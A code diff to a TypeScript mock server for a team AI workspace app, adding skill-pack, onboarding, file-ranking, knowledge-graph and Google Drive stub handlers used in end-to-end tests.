-      const filesStarter = l!.starter && skill && files.length ? { kind: l!.starter.kind, skill: { path: skill.path, name: skill.name, title: skill.title ?? skill.name }, files, by } : null
-      const starter = filesStarter ?? (skill && maker && !skill.inputs?.length ? { kind: 'skill' as const, skill: { path: skill.path, name: skill.name, title: skill.title ?? skill.name }, files: [], by: maker } : null)
-      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, ''), next, starter, skillBy: maker } }
+      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, ''), next, skillBy: maker } }
     },
     // onboarding A, B, D: the scripted AI answers everyone, there is no hosting trial credit and no company profile yet
     // (the composer's "no AI" line, Admin › AI connections and the skill forms ask for these on their own)
@@ -1803,6 +2381,91 @@ export class MockServer {
     requestAiAccess: () => fail('forbidden', 403, '이미 AI를 쓸 수 있어요.'),
     trialCredit: () => ({ credit: null }),
     getCompanyProfile: () => ({ profile: this.companyProfile }),
+    // the kept skills (server/src/onboarding/skill-packs.ts skillPackCatalog, short): every one in CATALOG's order, in
+    // the team's language (Korean, else English), whether the team has it (its path, or a team skill of its name), its
+    // example (the server's own, packExample, unless a test set one)
+    listSkillPacks: (c) => {
+      if (this.packsFail) fail('internal', 500, '지금은 불러오지 못했어요')
+      const ko = this.settings.defaultLocale === 'ko'
+      const team = this.skillsFor(c.user).filter((x) => x.path.startsWith('skills/'))
+      return {
+        profile: !!this.companyProfile,
+        skills: PACK_CATALOG.map((k) => {
+          const path = `skills/${k.pack}/${k.name}/SKILL.md`
+          return {
+            pack: k.pack, name: k.name, path, title: ko ? k.ko : k.en, description: ko ? k.lineKo : k.lineEn,
+            inTeam: this.files.has(path) || team.some((x) => x.name.toLowerCase() === k.name), visual: k.visual,
+            example: Object.hasOwn(this.packExamples, k.name) ? this.packExamples[k.name] ?? null : packExample(ko ? 'ko' : 'en', k.name), locale: ko ? 'ko' : 'en',
+            source: k.name !== 'humanizer' ? { kind: 'team' } : ko ? { kind: 'team_writing' } : { kind: 'adapted', author: 'Siqi Chen', project: 'humanizer', license: 'MIT', url: 'https://github.com/blader/humanizer' },
+          }
+        }),
+      }
+    },
+    // what the team prepared, as the caller (server/src/skills/examples.ts teamPrepared, short; docs/DECISIONS.md "W6.3"):
+    // their team and group skills (the landing skill first, then the kept ones at their pack path with their example,
+    // then the others), the team group folder's documents (all levels down, at most 100, without the brand folder, the
+    // group's skills, dot and system files; null for a member outside the team group: the server's group rule), whether
+    // they sent a team skill's "/<name>", whether a company profile is saved. /__test/prepared-fail: the read fails
+    skillExamples: (c) => {
+      if (this.preparedFail) fail('internal', 500, '지금은 불러오지 못했어요')
+      const ko = this.settings.defaultLocale === 'ko'
+      const mine = this.skillsFor(c.user).filter((x) => !x.personal)
+      const kept = ['humanizer', 'card-news', 'promo-video', 'intro-deck'].flatMap((name) => {
+        const k = PACK_CATALOG.find((x) => x.name === name)!
+        const s = mine.find((x) => x.path === `skills/${k.pack}/${k.name}/SKILL.md`)
+        if (!s) return []
+        const example = Object.hasOwn(this.packExamples, k.name) ? this.packExamples[k.name] ?? undefined : packExample(ko ? 'ko' : 'en', k.name) ?? undefined
+        const source = k.name !== 'humanizer' ? { kind: 'team' as const } : ko ? { kind: 'team_writing' as const } : { kind: 'adapted' as const, author: 'Siqi Chen', project: 'humanizer', license: 'MIT', url: 'https://github.com/blader/humanizer' }
+        return [{ path: s.path, name: s.name, title: s.title ?? s.name, summary: c.user.locale === 'ko' ? k.lineKo : k.lineEn, ...(example ? { example, locale: ko ? 'ko' as const : 'en' as const } : {}), source }]
+      })
+      const others = mine.filter((x) => !kept.some((k) => k.path === x.path)).map((x) => ({ path: x.path, name: x.name, title: x.title ?? x.name, summary: x.description.split('\n')[0]!.slice(0, 200) }))
+      const shared = this.welcome?.shared?.landing ?? null
+      const landing = shared && mine.some((x) => x.path === shared) ? shared : null
+      const all = [...kept, ...others]
+      const skills = landing ? [...all.filter((x) => x.path === landing), ...all.filter((x) => x.path !== landing)] : all
+      const tg = this.welcome?.teamGroup ?? null
+      const inGroup = !!tg && (c.user.role !== 'member' || c.user.groupIds.includes(tg.id) || !!this.groups.find((g) => g.id === tg.id)?.memberIds.includes(c.user.id))
+      let teamFolder: { path: string; files: number; more: boolean; without: string[] } | null = null
+      if (tg && inGroup && this.files.get(tg.folder)?.type === 'folder' && this.access(tg.folder, c.user) !== 'none') {
+        const skip = [tg.brandFolder ?? `${tg.folder}/브랜드`, `${tg.folder}/skills`]
+        const system = /^(\.|~\$)|^(thumbs\.db|desktop\.ini)$/i
+        const docs = [...this.files.entries()].filter(([p, n]) => n.type === 'file' && p.startsWith(`${tg.folder}/`) && !skip.some((k) => p === k || p.startsWith(`${k}/`))
+          && !p.slice(tg.folder.length + 1).split('/').some((seg) => system.test(seg)) && this.access(p, c.user) !== 'none').length
+        teamFolder = { path: tg.folder, files: Math.min(docs, 100), more: docs > 100, without: skip.map((k) => k.slice(tg.folder.length + 1)) }
+      }
+      const teamNames = mine.filter((x) => x.path.startsWith('skills/')).map((x) => x.name.toLowerCase())
+      const ran = (text: string) => { const t = text.trim().toLowerCase(); return teamNames.some((n) => t === `/${n}` || t.startsWith(`/${n} `) || t.startsWith(`/${n}\n`)) }
+      const ranTeamSkill = this.messages.some((m) => m.role === 'user' && m.author?.id === c.user.id && ran(m.content))
+      return { skills, teamFolder, landing, ranTeamSkill, hasProfile: !!this.companyProfile }
+    },
+    // the skills a person checked (server: installSkillPack with `skills`): written when free, `blocked` with the other
+    // path when a team skill elsewhere has the name; an owner's install marks 내 스킬 done (routes/onboarding-packs.ts)
+    installSkillPack: (c) => {
+      if (this.packInstallFails > 0) { this.packInstallFails--; fail('internal', 500, '지금은 넣지 못했어요') }
+      const id = c.params.id as 'general' | 'work'
+      const all = PACK_CATALOG.filter((k) => k.pack === id)
+      if (!all.length) fail('not_found', 404)
+      const names: string[] = (c.body as { skills?: string[] }).skills ?? all.map((k) => k.name)
+      const ko = this.settings.defaultLocale === 'ko'
+      const at = now()
+      // a name not in the pack is refused before anything is written (server: installSkillPack)
+      const unknown = names.find((name) => !all.some((x) => x.name === name))
+      if (unknown !== undefined) fail('validation', 400, `${unknown}: 이 묶음의 스킬이 아니에요`)
+      const skills = names.map((name) => {
+        const k = all.find((x) => x.name === name)!
+        const path = `skills/${id}/${name}/SKILL.md`
+        if (this.files.has(path)) return { name, path, status: 'present' as const }
+        const other = this.skillsFor(c.user).find((x) => x.path.startsWith('skills/') && x.name.toLowerCase() === name)
+        if (other) return { name, path, status: 'blocked' as const, sameNameAs: other.path }
+        for (const d of [`skills/${id}`, `skills/${id}/${name}`]) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
+        this.putFile(path, name === 'card-news' ? CARDNEWS_TEXT : name === 'promo-video' ? PROMO_TEXT : name === 'intro-deck' ? DECK_TEXT : `---\nname: ${name}\ndescription: ${ko ? k.ko : k.en}\nmetadata:\n  title: ${ko ? k.ko : k.en}\n---\n# ${ko ? k.ko : k.en}\n`)
+        return { name, path, status: 'created' as const }
+      })
+      if (this.welcome && !this.welcome.finishedAt && c.user.role === 'owner' && skills.some((x) => x.status !== 'blocked')) {
+        this.welcome = this.welcomeSaved({ ...this.welcome, steps: { ...this.welcome.steps, skills: 'done' } }, at)
+      }
+      return { pack: id, locale: ko ? 'ko' : 'en', skills }
+    },
     saveCompanyProfile: (c) => (this.companyProfile = { ...(c.body as import('@mycel/shared/api').CompanyProfileInput), updatedAt: now() }),
     // the website reading (server/src/onboarding/draft.ts, short): running for its first read, then a draft made from the
     // team's name; like the server, its chat is not in the chat list (server/src/chat/internal-chats.ts)
@@ -1822,59 +2485,49 @@ export class MockServer {
       return { ...base, status: 'done', draft: { website: d!.website, name: team, oneLine: `${team}는 조용한 책상 선풍기를 만들어요`, products: '책상 선풍기', audience: '작은 사무실', tone: ['친근한'], avoid: '',
         sources: d!.website ? [{ field: 'oneLine', url: d!.website, excerpt: '조용한 책상 선풍기' }] : [] } }
     },
-    // the welcome steps (server/src/onboarding/welcome.ts, the same rules in short): one record, the pack once
+    // the welcome steps (server/src/onboarding/welcome.ts, the same rules in short): one record, the general pack once
     getWelcome: () => ({ progress: this.welcome }),
     updateWelcome: (c) => {
       const at = now()
-      const p: WelcomeProgress = this.welcome ?? { startedAt: at, updatedAt: at, teamType: null, steps: { profile: null, result: null, invite: null }, pack: null, resultChatId: null, inviteShownAt: null, site: null, dismissedAt: null, finishedAt: null }
+      const p: WelcomeProgress = this.welcome ?? { startedAt: at, updatedAt: at, teamType: null, steps: { profile: null, result: null, skills: null, files: null, tools: null, invite: null }, resultChatId: null, inviteShownAt: null, site: null, dismissedAt: null, finishedAt: null }
       const b = c.body as import('@mycel/shared/api').WelcomeUpdate
       if (b.resultChatId !== undefined) {
         if (!this.chats.some((x) => x.id === b.resultChatId)) fail('not_found', 404)
-        p.resultChatId = b.resultChatId
+        // the deck's chat counts once it holds a message (server: welcome.ts)
+        if (this.messages.some((m) => m.chatId === b.resultChatId)) p.resultChatId = b.resultChatId
       }
       if (b.teamType) p.teamType = b.teamType
       if (b.step) {
         if (b.step.state === 'done' || p.steps[b.step.id] !== 'done') p.steps[b.step.id] = b.step.state
-        if (b.step.id === 'result' && b.step.state === 'done' && p.steps.invite === 'skipped') p.steps.invite = null
+        if (b.step.id === 'skills') delete p.skillsLater
+      }
+      // 내 스킬 put off on a phone (docs/DECISIONS.md "SK"); the invite's landing skill among the shared ones
+      if (b.skillsLater && !b.step && p.steps.skills !== 'done') { p.steps.skills = 'skipped'; p.skillsLater = true }
+      if (b.landing !== undefined) {
+        if (!p.shared?.skills.some((x) => x.path === b.landing)) fail('validation', 400)
+        p.shared = { ...p.shared!, landing: b.landing }
       }
       if (b.inviteShown && !p.inviteShownAt) p.inviteShownAt = at
+      if (b.doneShown && !p.doneShownAt) p.doneShownAt = at
       if (b.site) p.site = b.site
       if (b.dismissed !== undefined) p.dismissedAt = b.dismissed ? (p.dismissedAt ?? at) : null
-      // "자료 없이 해 볼게요" without the marketing pack: the result and the invite put off, the steps finished
+      // "자료 없이 해 볼게요": the result and the invite put off, the steps finished
       if (b.finish) {
         if (p.steps.result !== 'done') p.steps.result = 'skipped'
+        p.steps.tools ??= 'skipped'
         p.steps.invite ??= 'skipped'
         p.finishedAt ??= at
       }
-      if (!p.finishedAt && p.steps.profile === 'done' && p.steps.result === 'done' && p.steps.invite) p.finishedAt = at
-      p.updatedAt = at
-      this.welcome = p
-      return { progress: p }
+      this.welcome = this.welcomeSaved(p, at)
+      return { progress: this.welcome }
     },
-    installWelcomePack: (c) => {
-      const at = now()
-      const p = (this.handlers.updateWelcome!({ ...c, body: {} }) as { progress: WelcomeProgress }).progress
-      if (p.pack) return { progress: p, install: null, outcome: 'already' }
-      for (const d of ['skills/marketing', 'skills/marketing/ad-copy']) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
-      this.putFile(WELCOME_RESULT_SKILL, '---\nname: ad-copy\ndescription: 광고 문구 — 광고 문구 3안\nmetadata:\n  title: 광고 문구\n---\n# 광고 문구\n')
-      p.pack = { id: 'marketing', at, skillPath: WELCOME_RESULT_SKILL }
-      return { progress: p, install: { pack: 'marketing', locale: this.settings.defaultLocale, skills: [{ name: 'ad-copy', path: WELCOME_RESULT_SKILL, status: 'created' }], folders: [] }, outcome: 'installed' }
-    },
-    // every team's start (server/src/onboarding/welcome.ts): the general pack once, and the team's group (named after
-    // the team, the owner in it) with groups/<name>/, its meeting notes folder and its brand folder, once
+    // every team's start (server/src/onboarding/welcome.ts): no pack (docs/DECISIONS.md "W6": the record with no paths),
+    // and the team's group (named after the team, the owner in it) with groups/<name>/, its meeting notes folder and its
+    // brand folder, once
     setupWelcomeTeam: (c) => {
       const at = now()
       const p = (this.handlers.updateWelcome!({ ...c, body: {} }) as { progress: WelcomeProgress }).progress
-      let install = null
-      if (!p.general) {
-        const skills = [['meeting-tasks', GENERAL_TASKS_SKILL, '할 일 정리'], ['doc-brief', GENERAL_BRIEF_SKILL, '핵심 정리'], ['card-news', GENERAL_CARDNEWS_SKILL, '카드뉴스'], ['promo-video', GENERAL_PROMO_SKILL, '홍보 영상'], ['intro-deck', GENERAL_DECK_SKILL, '회사 소개서']] as const
-        for (const [name, path, title] of skills) {
-          for (const d of ['skills/general', `skills/general/${name}`]) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
-          if (!this.files.has(path)) this.putFile(path, path === GENERAL_CARDNEWS_SKILL ? CARDNEWS_TEXT : path === GENERAL_PROMO_SKILL ? PROMO_TEXT : path === GENERAL_DECK_SKILL ? DECK_TEXT : `---\nname: ${name}\ndescription: ${title}\nmetadata:\n  title: ${title}\n---\n# ${title}\n`)
-        }
-        p.general = { at, tasksPath: GENERAL_TASKS_SKILL, briefPath: GENERAL_BRIEF_SKILL, cardNewsPath: GENERAL_CARDNEWS_SKILL, promoVideoPath: GENERAL_PROMO_SKILL, introDeckPath: GENERAL_DECK_SKILL }
-        install = { pack: 'general' as const, locale: this.settings.defaultLocale, skills: skills.map(([name, path]) => ({ name, path, status: 'created' as const })), folders: [] }
-      }
+      p.general ??= { at }
       if (!p.teamGroup) {
         // like server/src/onboarding/welcome.ts: a group these steps did not make is never taken over ("Acme 2")
         const team = this.settings.teamName
@@ -1888,39 +2541,55 @@ export class MockServer {
       }
       // the brand folder (docs/DECISIONS.md "N"), also for a group recorded before it
       if (!p.teamGroup.brandFolder) {
-        const brandFolder = `${p.teamGroup.folder}/${this.localized(PACK_FOLDERS.brand)}`
+        const brandFolder = `${p.teamGroup.folder}/${this.localized(BRAND_FOLDER)}`
         this.files.set(brandFolder, this.files.get(brandFolder) ?? { type: 'folder', mtime: at })
         p.teamGroup = { ...p.teamGroup, brandFolder }
       }
       p.updatedAt = at
-      return { progress: p, install, outcome: install ? 'installed' : 'already' }
+      return { progress: p, install: null, outcome: 'already' as const }
     },
-    // the first result, the company intro deck (server/src/onboarding/welcome-result.ts, short): the owner's files in
-    // the brand folder, or a 회사 소개.md written there; a new chat of the owner's; the intro deck skill once for an
-    // older row.
-    // The mock collects no website images (images: []).
-    startFirstResult: (c) => {
+    // 회사 소개's brand materials (server/src/onboarding/welcome-result.ts placeBrand, short): the team's start when it is
+    // missing, the brand images folder, and 회사 소개.md unless the owner gave intro files (one there is kept); no chat,
+    // no skill. The mock collects no website images (images: []).
+    welcomeBrand: (c) => {
       const at = now()
-      const p = this.welcome
-      const g = p?.teamGroup
-      if (!p || !p.general || !g?.brandFolder) fail('conflict', 409, '팀 폴더가 아직 없어요. 시작 설정을 다시 열어 주세요.')
-      const files = (c.body as import('@mycel/shared/api').StartFirstResult).files
-      for (const f of files) if (this.files.get(f)?.type !== 'file' || !f.startsWith(g!.brandFolder! + '/')) fail('not_found', 404)
-      if (!p!.general!.introDeckPath) {
-        for (const d of ['skills/general', 'skills/general/intro-deck']) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
-        if (!this.files.has(GENERAL_DECK_SKILL)) this.putFile(GENERAL_DECK_SKILL, DECK_TEXT)
-        p!.general = { ...p!.general!, introDeckPath: GENERAL_DECK_SKILL }
-      }
-      const imagesFolder = `${g!.brandFolder}/${this.localized(BRAND_IMAGES_FOLDER)}`
+      if (!this.welcome?.teamGroup?.brandFolder) this.handlers.setupWelcomeTeam!({ ...c, body: {} })
+      const p = this.welcome!
+      const g = p.teamGroup!
+      const files = (c.body as import('@mycel/shared/api').WelcomeBrand).files
+      for (const f of files) if (this.files.get(f)?.type !== 'file' || !f.startsWith(g.brandFolder! + '/')) fail('not_found', 404)
+      const imagesFolder = `${g.brandFolder}/${this.localized(BRAND_IMAGES_FOLDER)}`
       this.files.set(imagesFolder, this.files.get(imagesFolder) ?? { type: 'folder', mtime: at })
       let intro: string | null = null
       if (!files.length) {
-        intro = `${g!.brandFolder}/회사 소개.md`
-        this.putFile(intro, `# 회사 소개\n\n${this.settings.teamName}${p!.site ? ` · ${p!.site}` : ''}\n`)
+        intro = `${g.brandFolder}/회사 소개.md`
+        if (!this.files.has(intro)) this.putFile(intro, `# 회사 소개\n\n${this.settings.teamName}${p.site ? ` · ${p.site}` : ''}\n`)
       }
-      const chat = (this.handlers.createChat!({ ...c, body: { projectId: null, title: '우리 회사 소개서' } }) as { body: Chat }).body
-      p!.updatedAt = at
-      return { status: 201, body: { chatId: chat.id, title: chat.title, skillPath: p!.general!.introDeckPath!, files: intro ? [intro] : files, intro, imagesFolder, images: [] } }
+      p.updatedAt = at
+      return { progress: p, brandFolder: g.brandFolder!, imagesFolder, images: [], intro }
+    },
+    // 팀 파일's AI picks (server/src/onboarding/file-rank.ts, short): a file whose name says what it is, best first;
+    // owners and admins only
+    rankTeamFiles: async (c) => {
+      if (c.user.role === 'member') fail('forbidden', 403)
+      const entries = c.body.entries as { id: string; name: string; path: string }[]
+      this.fileRankCalls.push({ entries })
+      if (this.fileRank.delayMs) await new Promise((done) => setTimeout(done, this.fileRank.delayMs))
+      if (this.fileRank.ai !== 'done') return { ai: this.fileRank.ai, picks: [] }
+      const WORDS: [RegExp, string][] = [[/양식|서식|템플릿|template/i, 'form'], [/소개/, 'intro'], [/회의록/, 'minutes'], [/보고/, 'report'], [/규정|정책/, 'policy'], [/로고|브랜드/, 'brand'], [/매뉴얼|교육|가이드/, 'training'], [/제안/, 'proposal']]
+      const picks = entries.flatMap((e) => { const w = WORDS.find(([re]) => re.test(e.name)); return w ? [{ id: e.id, reason: w[1] }] : [] })
+      return { ai: 'done', picks }
+    },
+    // the step's upload run landed a file (server/src/onboarding/team-files.ts, short): 팀 파일 done, once, for a file
+    // in a group's folder
+    teamFilesLanded: (c) => {
+      if (c.user.role === 'member') fail('forbidden', 403)
+      const path = c.body.path as string
+      const p = this.welcome
+      if (!p || p.steps.files === 'done' || !path.startsWith('groups/') || this.files.get(path)?.type !== 'file') return { recorded: false }
+      p.steps.files = 'done'
+      this.welcome = this.welcomeSaved(p, now())
+      return { recorded: true }
     },
     // the one suggestion under a result (server/src/onboarding/suggestions.ts): none unless a test sets one
     // (/__test/result-suggestion); closing one keeps it closed
@@ -1977,6 +2646,7 @@ export class MockServer {
     updateGroup: (c) => Object.assign(this.groups.find((g) => g.id === c.params.id) ?? fail('not_found', 404), Object.fromEntries(Object.entries(c.body).filter(([, v]) => v !== undefined))),
     deleteGroup: (c) => {
       this.groups = this.groups.filter((g) => g.id !== c.params.id)
+      this.dropAssignee('group', c.params.id)
       // its rules go; its folder row stays, no longer a group's (the server's deleteGroup)
       for (const f of this.folders) {
         f.rules = f.rules.filter((r) => !(r.subjectType === 'group' && r.subjectId === c.params.id))
@@ -1995,8 +2665,6 @@ export class MockServer {
       const u = this.users.find((x) => x.id === subjectId)
       if (subjectType === 'user' && (!u || u.role !== 'member')) fail('validation', 400, '팀장·관리자는 항상 팀 스킬을 관리해요.')
       if (!(p === 'skills' || p.startsWith('skills/'))) fail('validation', 400, 'skills/ 안의 볼 수 있는 폴더를 골라 주세요.')
-      this.skillManagers = this.skillManagers.filter((g) => !(g.subjectType === subjectType && g.subjectId === subjectId && g.path === p))
-      if (enabled) this.skillManagers.push({ subjectType, subjectId, path: p })
       if (enabled && !this.files.has(p)) this.files.set(p, { type: 'folder', mtime: now() })
       // the same rule Admin > 폴더 권한 shows
       let f = this.folders.find((x) => x.path === p)
@@ -2019,6 +2687,12 @@ export class MockServer {
       suggestFolders: ['skills', 'skills/재무'],
       pendingReview: this.suggestions.filter((s) => s.status === 'pending' && this.manages(c.user, s.targetFolder)).length,
       myPending: this.suggestions.filter((s) => s.status === 'pending' && s.suggester.id === c.user.id).length,
+      // open share proposals others made to the person's groups (docs/DECISIONS.md "Group skills")
+      sharesToReview: (() => {
+        const st = (this as unknown as { skillShareState?: { gen: number; rows: { share: { status: string }; owner: string; group: string | null }[] } }).skillShareState
+        const mineGroups = new Set(this.groupSkillRoots(c.user).map((g) => g.id))
+        return st?.gen === this.generation ? st.rows.filter((r) => r.owner !== c.user.id && r.group !== null && mineGroups.has(r.group) && (r.share.status === 'checking' || r.share.status === 'ready')).length : 0
+      })(),
       ...(this.aiList ? { aiList: this.aiList } : {}),
     }),
     listSkillSuggestions: (c) => ({
@@ -2113,7 +2787,7 @@ export class MockServer {
       if (c.body.concurrency) this.settings.concurrency = c.body.concurrency
       if (c.body.enabled?.codex !== undefined) this.codexEnabled = c.body.enabled.codex
       if (c.body.enabled?.api !== undefined) this.apiEngineEnabled = c.body.enabled.api
-      if (c.body.limitFallback === true && !this.codexEnabled) fail('conflict', 409, 'Codex가 꺼져 있어 한도 대체를 켤 수 없어요.')
+      if (c.body.limitFallback === true && !this.codexEnabled) fail('conflict', 409, "Codex가 꺼져 있어 '다른 AI로 대신 답하기'를 켤 수 없어요.")
       if (c.body.limitFallback !== undefined) this.limitFallback = c.body.limitFallback
       if (!this.codexEnabled) this.limitFallback = false
       if (c.body.memberChoice) this.memberChoice = c.body.memberChoice
@@ -2123,7 +2797,7 @@ export class MockServer {
     checkEngine: (c) => this.enginesResponse().engines.find((e) => e.id === c.params.id) ?? fail('not_found', 404),
     // the team's API engine: not set up (like a fresh server)
     getApiEngine: () => ({ baseUrl: null, model: null, label: null, hasKey: false }),
-    putApiEngine: (c) => ({ baseUrl: c.body.baseUrl, model: c.body.model, label: c.body.label ?? null, hasKey: !!c.body.key }),
+    putApiEngine: (c) => c.body.password !== this.passwords.get(c.user.username) ? fail('forbidden', 403, '비밀번호가 맞지 않아요.', { 'body.password': 'wrong password' }) : ({ baseUrl: c.body.baseUrl, model: c.body.model, label: c.body.label ?? null, hasKey: !!c.body.key }),
     listBudgets: () => ({ items: this.budgets }),
     createBudget: (c) => {
       const b: Budget = { id: uuidv7(), subjectType: c.body.subjectType, subjectId: c.body.subjectId, period: c.body.period, limitUsd: c.body.limitUsd, limitTokens: c.body.limitTokens ?? null, action: c.body.action, usedUsd: 0, usedTokens: 1234 }
@@ -2135,7 +2809,7 @@ export class MockServer {
       this.budgets = this.budgets.filter((b) => b.id !== c.params.id)
       return undefined
     },
-    settings: () => this.settings,
+    settings: () => ({ ...this.settings, speechProvider: this.speechNow() }),
     // SpeechKeyStatus.hosted (0.2.17): the hosting service's free hours; none on this mock server
     speechKey: () => ({ ...this.speechKey, hosted: null }),
     speechHost: () => this.speechHost,
@@ -2147,13 +2821,14 @@ export class MockServer {
       const before = this.settings.defaultLocale
       const policyBefore = this.settings.browserAllowAll
       // like server/src/admin/settings.ts: a new speech provider starts "Turn video sound into text" from its default
-      const providerChanged = c.body.speechProvider !== undefined && c.body.speechProvider !== this.settings.speechProvider
+      const providerChanged = c.body.speechProvider !== undefined && c.body.speechProvider !== this.speechNow()
+      if (c.body.speechProvider !== undefined) this.speechChosen = true
       Object.assign(this.settings, c.body)
       if (providerChanged && c.body.aiMediaTranscripts === undefined) this.settings.aiMediaTranscripts = null
       this.syncLocales()
       if (this.settings.defaultLocale !== before) this.publish(LOCALE_CHANGED)
       if (this.settings.browserAllowAll !== policyBefore) this.publish(BROWSER_POLICY_CHANGED)
-      return this.settings
+      return { ...this.settings, speechProvider: this.speechNow() }
     },
     // like server/src/admin/team-icon.ts: the same checks (shared/src/team-icon.ts) and words
     putTeamIcon: async (c) => {
@@ -2167,6 +2842,43 @@ export class MockServer {
       this.teamIcon = { bytes, type: r.type, width: r.width, height: r.height, version: sha256Hex(bytes).slice(0, 16) }
       this.publish(TEAM_ICON_CHANGED)
       return { version: this.teamIcon.version, type: r.type, width: r.width, height: r.height, size: bytes.byteLength }
+    },
+    // like server/src/routes/knowledge-graph.ts: on needs CodeGraph; off clears the folders; added folders outside users/
+    knowledgeGraphStatus: () => this.kg,
+    updateKnowledgeGraph: (c) => {
+      if (c.body.enabled === true && !this.kg.available) throw new Fail('conflict', 409, 'CodeGraph is not installed', undefined, { reason: 'unavailable' })
+      if (c.body.added !== undefined) {
+        const added = c.body.added as string[]
+        for (const a of added) {
+          if (a.startsWith('users')) throw new Fail('validation', 400, 'personal', { 'body.added': 'personal' }, { reason: 'personal' })
+          if (!/^[\w.-]+(\/[\w.-]+)*$/.test(a) || a.startsWith('nope')) throw new Fail('validation', 400, 'not found', { 'body.added': 'not_found' }, { reason: 'not_found' })
+        }
+        this.kg = { ...this.kg, added: [...new Set(added)] }
+      }
+      if (c.body.enabled === false) this.kg = { ...this.kg, enabled: false, roots: [], personal: { folders: 0, files: 0, symbols: 0 }, diskBytes: 0, busy: 0 }
+      if (c.body.enabled === true && !this.kg.enabled) this.kg = { ...mockKnowledgeGraph(true), added: this.kg.added, documents: this.kg.documents }
+      // documents: off deletes the index (nothing listed); on brings the made-up folders back
+      if (c.body.documents === false) this.kg = { ...this.kg, documents: mockKgDocuments(false) }
+      if (c.body.documents === true && !this.kg.documents.enabled) this.kg = { ...this.kg, documents: mockKgDocuments(true) }
+      return this.kg
+    },
+    // like the server: part code, documents or (none) both, of the parts that are on
+    rebuildKnowledgeGraph: (c) => {
+      const part = c.body.part as 'code' | 'documents' | undefined
+      const code = this.kg.enabled && part !== 'documents', docs = this.kg.documents.enabled && part !== 'code'
+      if (!code && !docs) throw new Fail('conflict', 409, 'off', undefined, { reason: 'off' })
+      const d = this.kg.documents
+      this.kg = {
+        ...this.kg,
+        ...(code ? { roots: this.kg.roots.map((r) => ({ ...r, status: 'pending' as const, files: 0, symbols: 0 })), busy: this.kg.roots.length } : {}),
+        documents: docs ? { ...d, folders: d.folders.map((f) => ({ ...f, status: 'pending' as const })), busy: d.folders.length } : d,
+      }
+      // the rebuild "finishes" a moment later
+      setTimeout(() => {
+        const fresh = mockKnowledgeGraph(true)
+        this.kg = { ...this.kg, ...(code ? { roots: fresh.roots, busy: 0 } : {}), documents: docs ? fresh.documents : this.kg.documents }
+      }, 1500)
+      return this.kg
     },
     deleteTeamIcon: () => {
       if (this.teamIcon) this.publish(TEAM_ICON_CHANGED)
@@ -2266,7 +2978,6 @@ export class MockServer {
     listCredentials: () => ({ items: this.credentials.map((c) => this.credentialView(c)), memberOwn: this.credMemberOwn, sharedSubscriptions: this.credSharedSubscriptions, allowedKinds: ['anthropic-oauth', 'anthropic-api-key', 'chatgpt', 'openai-api-key'], pricesAsOf: '2026-10-22' }),
     sealingKey: () => this.sealer.publicKey(),
     createCredential: async (c) => {
-      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403, '비밀번호가 맞지 않아요.', { 'body.password': 'wrong password' })
       return { status: 201, body: await this.addCredential(c.user, c.body, false) }
     },
     createMyCredential: async (c) => {
@@ -2284,7 +2995,6 @@ export class MockServer {
       return x
     },
     replaceCredentialSecret: async (c) => {
-      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403)
       const x = this.credentials.find((y) => y.id === c.params.id) ?? fail('not_found', 404)
       await this.sealer.unseal(c.body.sealed, 'credential.replace').catch(() => fail('validation', 400))
       x.state = 'ok'; x.detail = null
@@ -2314,7 +3024,6 @@ export class MockServer {
     myCredentials: (c) => ({ allowed: this.credMemberOwn, allowedKinds: ['anthropic-oauth', 'anthropic-api-key', 'chatgpt', 'openai-api-key'], items: this.credentials.filter((x) => x.owner?.id === c.user.id) }),
     startCredentialLogin: (c) => {
       if (!this.credSharedSubscriptions) fail('forbidden', 403)
-      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403)
       return { status: 202, body: this.startLogin(c.user, c.body.label, false, c.body.reconnectId, c.body.kind) }
     },
     startMyCredentialLogin: (c) => {
@@ -2325,14 +3034,75 @@ export class MockServer {
     submitMyCredentialLoginCode: (c) => this.loginCode(c.params.id, c.user, c.body.sealed),
     getCredentialLogin: (c) => this.loginOf(c.params.id, c.user),
     getMyCredentialLogin: (c) => this.loginOf(c.params.id, c.user),
-    cancelCredentialLogin: (c) => { this.cancelLogin(c.params.id, c.user); return undefined },
+    cancelCredentialLogin: (c) => { this.cancelLogin(c.params.id, c.user, true); return undefined },
     cancelMyCredentialLogin: (c) => { this.cancelLogin(c.params.id, c.user); return undefined },
 
     // Google Drive (server/src/routes/drive.ts): this test server has no Google client, like a server not set up for it.
     // e2e tests that need the other states answer these addresses themselves (test/e2e/drive.spec.ts).
-    myDriveConnection: () => (this.driveClient === 'none'
-      ? { configured: false, status: 'disabled', account: null, scopes: [], expiresAt: null }
-      : { configured: true, status: 'disconnected', account: null, scopes: [], expiresAt: null }),
+    myDriveConnection: (c) => (this.driveClient === 'none'
+      ? { configured: false, status: 'disabled', account: null, scopes: [], expiresAt: null, personalAllowed: this.driveMembers, teamShares: [] }
+      : { configured: true, status: 'disconnected', account: null, scopes: [], expiresAt: null, personalAllowed: this.driveMembers,
+          teamShares: this.driveShares.filter((x) => x.status === 'connected' && this.driveShareCovers(x, c.user)).map((x) => ({ id: x.id, name: x.name, folders: x.folders, wholeDrive: x.wholeDrive })) }),
+    authorizeDrive: (c) => {
+      // an owner or admin may start their own while members may not (docs/DECISIONS.md "W6")
+      if (!this.driveMembers && c.user.role === 'member') fail('forbidden', 403, 'drive_members_off')
+      return { flowId: 'personal-flow', authorizationUrl: 'https://accounts.google.com/o/oauth2/v2/auth?state=synthetic', expiresAt: new Date(Date.now() + 600_000).toISOString() }
+    },
+    // the share sign-in (mock Google): pending once, then the synthetic account is back
+    driveFlow: (c) => {
+      const f = this.driveShareFlow
+      if (!f || f.id !== c.params.id) fail('not_found', 404, 'drive_not_found')
+      return { flowId: f!.id, state: f!.polls++ < 1 ? 'pending' : 'ready', account: { name: 'Admin Fixture', email: 'drive-admin@example.test' }, expiresAt: new Date(Date.now() + 600_000).toISOString(), reason: null }
+    },
+    cancelDriveFlow: () => { this.driveShareFlow = null; return undefined },
+    setDriveMembers: (c) => { this.driveMembers = c.body.on; return this.driveAdminStatus() },
